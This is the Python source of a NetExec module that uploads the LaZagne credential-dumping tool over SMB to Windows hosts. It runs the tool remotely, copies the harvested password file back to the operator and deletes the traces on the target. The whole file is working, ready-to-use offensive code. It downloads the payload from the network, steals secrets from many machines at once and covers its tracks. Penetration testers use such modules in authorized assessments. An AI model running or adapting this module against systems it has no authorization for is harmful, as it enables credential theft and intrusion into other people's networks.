# lazagne module for nxc python3
# author of the module : github.com/thomas-x64   |   module was mostly copied from github.com/mpgn handlekatz module
# lazagne: https://github.com/AlessandroZ/LaZagne

import re
import sys
from nxc.paths import NXC_PATH
from os import makedirs, path
import urllib.request

class NXCModule:
    name = "lazagne"
    description = "Search for interesting credentials and secrets using lazagne"
    supported_protocols = ["smb"]
    opsec_safe = False
    multiple_hosts = True

    def options(self, context, module_options):
        r"""
This module will download the latest lazagne.exe (https://github.com/AlessandroZ/LaZagne/releases/latest/download/lazagne.exe) on the current machine if it doesnt exist in ~/.nxc/modules/LaZagne to distribute.
To use your own binary either place it in ~/.nxc/modules/LaZagne/LaZagne.exe or specify LAZAGNE_PATH + LAZAGNE_EXE_NAME
--OPTIONS:
TARGET_TMP_DIR     Path where lazagne.exe and result should be saved on target system (default: C:\\Windows\\Temp\\)
LAZAGNE_PATH       Path where lazagne.exe is located on your system (default: ~/.nxc/modules/LaZagne/) (if set, will not download newest release file)
LAZAGNE_EXE_NAME   Name of the lazagne executable (default: LaZagne.exe) (if set, will not download newest release file)
LAZAGNE_MODULE     Name of the lazagne module (default: all)
DIR_RESULT         Location where the result files are stored (default: ~/.nxc/modules/LaZagne/results/)
        """
        self.target_tmp_dir = "C:\\Windows\\Temp\\"
        self.share = "C$"
        self.tmp_share = self.target_tmp_dir.split(":")[1]
        self.lazagne_module = "all"
        self.lazagne_executable = "LaZagne.exe"
        self.lazagne_path = f"{NXC_PATH}/modules/LaZagne/"
        self.dir_result = f"{NXC_PATH}/modules/LaZagne/results/"
        self.download_latest_binary = True
        self.lazagne_download_link = "https://github.com/AlessandroZ/LaZagne/releases/latest/download/lazagne.exe"

        if "LAZAGNE_PATH" in module_options:
            self.lazagne_path = module_options["LAZAGNE_PATH"]
            self.download_latest_binary = False

        if "LAZAGNE_EXE_NAME" in module_options:
            self.lazagne_executable = module_options["LAZAGNE_EXE_NAME"]
            self.download_latest_binary = False

        if "LAZAGNE_MODULE" in module_options:
            self.lazagne_module = module_options["LAZAGNE_MODULE"]

        if "TARGET_TMP_DIR" in module_options:
            self.target_tmp_dir = module_options["TARGET_TMP_DIR"]
            self.tmp_share = self.target_tmp_dir.split(":")[1]

        if "DIR_RESULT" in module_options:
            self.dir_result = module_options["DIR_RESULT"]
        context.log.info(f"creating folders {NXC_PATH}/modules/LaZagne/results/ if they dont exist")
        makedirs(f"{NXC_PATH}/modules/LaZagne/results/", exist_ok=True)
        if self.download_latest_binary:
            context.log.info("downloading_latest_binary is true, no custom lazagnepath been specified")
            if path.exists(f"{self.lazagne_path}{self.lazagne_executable}"):
               context.log.display(f"NOT downloading LaZagne.exe from Github, file already exists at: {self.lazagne_path}{self.lazagne_executable}. Skipping..")
            else:
                context.log.display(f"Downloading LaZagne from {self.lazagne_download_link}. Saving to: {self.lazagne_path}{self.lazagne_executable}")
                urllib.request.urlretrieve(self.lazagne_download_link, f"{self.lazagne_path}{self.lazagne_executable}")

    def on_login(self, context, connection):
        lazagne_loc = self.lazagne_path + self.lazagne_executable

        context.log.display(f"Copy {self.lazagne_path + self.lazagne_executable} to {self.target_tmp_dir}")

        with open(lazagne_loc, "rb") as lazagne:
            try:
                connection.conn.putFile(self.share, self.tmp_share + self.lazagne_executable, lazagne.read)
                context.log.success(f"[OPSEC] Created file {self.lazagne_executable} on \\\\{self.share}{self.tmp_share}")
            except Exception as e:
                context.log.fail(f"Error writing file to share {self.share}: {e}")

        command = f"{self.target_tmp_dir}{self.lazagne_executable} {self.lazagne_module} -oN -output {self.target_tmp_dir}"
        context.log.display(f"Executing command {command}")

        p = connection.execute(command, True)
        context.log.debug(f"Command result: {p}")

        if "File written: " in p:
            context.log.success("LaZagne output file has been written.")
            dump = True
        else:
            context.log.info(f"Lazagne run returned: {p}")
            context.log.fail("Seems like LaZagne didn't write any result file. Perhaps AV or something else went wrong. Perhaps try again using verbose flag.")
            dump = False      

        if dump:
            regex = r"([_A-Za-z0-9-]*\.txt)"
            matches = re.search(regex, str(p), re.MULTILINE)
            if not matches:
                context.log.display("Error getting the lazagne result file name.")
                sys.exit(1)

            result_file = matches.group()
            context.log.display(f"Copy {result_file} to host")
            new_resultfile_name = f"{connection.hostname if connection.hostname else connection.remoteName}_{self.lazagne_module}_{result_file}"
            with open(self.dir_result + new_resultfile_name, "wb+") as res_file:
                try:
                    connection.conn.getFile(self.share, self.tmp_share + result_file, res_file.write)
                    context.log.success(f"LaZagne resultfile was transferred to {self.dir_result + new_resultfile_name}")
                except Exception as e:
                    context.log.fail(f"Error while get file: {e}")

            try:
                connection.conn.deleteFile(self.share, self.tmp_share + self.lazagne_executable)
                context.log.success(f"Deleted lazagne.exe on the {self.share} share")
                connection.conn.deleteFile(self.share, self.tmp_share + result_file)
                context.log.success(f"Deleted {result_file} on the {self.share} share")
            except Exception as e:
                context.log.fail(f"[OPSEC] Error deleting lazagne.exe / result file on share {self.share}: {e}")

